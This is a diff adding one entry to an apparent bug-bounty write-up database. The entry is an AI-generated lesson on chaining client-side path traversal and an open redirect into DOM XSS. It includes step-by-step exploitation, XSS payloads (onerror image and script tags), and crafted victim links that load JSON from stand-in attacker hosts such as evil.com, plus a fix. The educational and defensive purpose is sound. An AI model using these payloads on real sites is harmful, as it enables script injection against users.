@@ -1,5 +1,47 @@
 [
   {
+    "id": "82b4ddcd0223",
+    "title": "From CSPT to DOM XSS: Chaining an Open Redirect with Malicious JSON",
+    "url": "https://medium.com/@AstroKrypTech/from-cspt-to-dom-xss-chaining-an-open-redirect-with-malicious-json-71a58c462c2a",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "AstroKrypTech"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-09T18:07:57.000Z",
+    "added_at": "2026-10-09T19:47:42.433Z",
+    "categories": [
+      "xss",
+      "access-control",
+      "other"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A client-side path traversal (CSPT) vulnerability allowed an attacker to manipulate an API request URL, redirecting it to a malicious server to inject a script into the page via DOM XSS.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The application takes a user-provided ID from the URL and appends it directly to an API path without sanitization. This allows path traversal (using ../ to change the folder). The application then takes the resulting data and puts it into the page using innerHTML, which doesn't block malicious code.",
+      "walkthrough": "RECON\n1. The researcher visits the profile page to see how it loads data.\nURL: https://target.example/profile?id=123\nWhy: To identify how the id parameter (a piece of data in the URL) affects the page.\nDISCOVERY\n2. The researcher inspects the site's code to find how the id is used.\nconst id = new URLSearchParams(location.search).get(\"id\");\nWhy: The code uses URLSearchParams (a tool to read URL data) to grab the id from location.search (the part of the URL after the question mark).\n3. The researcher finds where the id is sent to the server.\nfetch(`/api/user/${id}`)\nWhy: The fetch command (a request for data) builds a web address by sticking the id directly onto the end of the API path.\n4. The researcher looks for how the server's response is handled.\n.then(user => { displayUser(user); })\nWhy: The app takes the user data from the server and passes it to a function to show it on the screen.\n5. The researcher checks the displayUser function for dangerous code.\nelement.innerHTML = user.name;\nWhy: The app uses innerHTML (a tool that turns text into live HTML) which is dangerous because it executes any code found in the text.\nEXPLOITATION\n6. The researcher tests if they can change the folder the app looks in.\n?id=../test\nWhy: By using path traversal (using ../ to move up a folder), the researcher tries to make the app request a different endpoint (server address).\n7. The researcher finds an Open Redirect (a bug that sends users to any site) on the same server.\n/api/redirect?url=https://attacker.com\nWhy: This allows the researcher to point the app's data request to a server they control.\n8. The researcher creates a malicious JSON (a data format) file on their own server.\n{\"name\": \"<img src=x onerror=alert('XSS')>\"}\nWhy: This payload (malicious code) uses an image tag that fails to load, triggering a script to run.\n9. The researcher combines the traversal and the redirect into a single id value.\n?id=../../redirect?url=https://attacker.com/malicious.json\nWhy: This forces the fetch command to go up two folders, hit the redirector, and load the attacker's file.\n10. The researcher sends the final link to a victim.\nhttps://target.example/profile?id=../../redirect?url=https://attacker.com/malicious.json\nWhy: When the victim clicks, their browser performs the malicious request automatically.\nIMPACT\n11. The browser receives the attacker's JSON data.\n{\"name\": \"<img src=x onerror=alert('XSS')>\"}\nWhy: The browser thinks this is legitimate user data from the app's own server.\n12. The application injects the malicious name into the page.\nelement.innerHTML = \"<img src=x onerror=alert('XSS')>\";\nWhy: Because innerHTML was used, the browser sees the script and runs it, completing the XSS (Cross-Site Scripting) attack.",
+      "example": "A fictional site target.example uses a script to load user bios: const bioId = new URLSearchParams(window.location.search).get('bioId'); fetch('/api/bios/' + bioId).then(r => r.json()).then(data => { document.getElementById('bio-box').innerHTML = data.content; }); An attacker finds an open redirect at /api/go?to=EXTERNAL_URL. They host a file at https://evil.com/xss.json containing {\"content\": \"<script>alert('Hacked')</script>\"}. By tricking a user into visiting https://target.example/profile?bioId=../../go?to=https://evil.com/xss.json, the fetch call is diverted to the attacker's server. The browser receives the script and, because the site uses innerHTML, it executes the alert.",
+      "takeaway": "Look for fetch() or XMLHttpRequest where the URL is built using user input. Check if the site has an open redirect that can be reached via ../ traversal. Always check how the JSON response is rendered; if you see .innerHTML, .outerHTML, or $().html(), it is a prime target for XSS. A common mistake is assuming that because the data comes from an API, it is safe to trust. Variants include using this to bypass Content Security Policy (CSP) by loading scripts from a trusted domain's redirector.",
+      "fix": "First, use textContent instead of innerHTML to ensure data is treated as plain text, not code. Second, sanitize the input by removing ../ sequences or using a whitelist of allowed characters. \n\nconst id = new URLSearchParams(location.search).get(\"id\");\nif (!/^[a-zA-Z0-9]+$/.test(id)) return;\nfetch(`/api/user/${id}`)\n .then(res => res.json())\n .then(user => {\n   document.getElementById('name').textContent = user.name;\n });",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "A client-side path traversal vulnerability in the application’s profile-page loader allows an attacker to influence the URL used for a JSON API request. By supplying traversal sequences in a query parameter, the request can be redirected from the expected API endpoint to an open redirect. The redirect then points to an attacker-controlled JSON response. The application accepts that response as valid object data and inserts one array field into the DOM using `innerHTML`. This creates a DOM-based XSS condition. ## Affected Functionality The affected workflow is a public profile page that loads a",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "9a6709168dc7",
     "title": "How I Got Unlimited Office 365 Premium Memberships & Unlimited LinkedIn Premium Vouchers",
     "url": "https://medium.com/@iamsecure1920/how-i-got-unlimited-office-365-premium-memberships-unlimited-linkedin-premium-vouchers-42ca4231e2af",
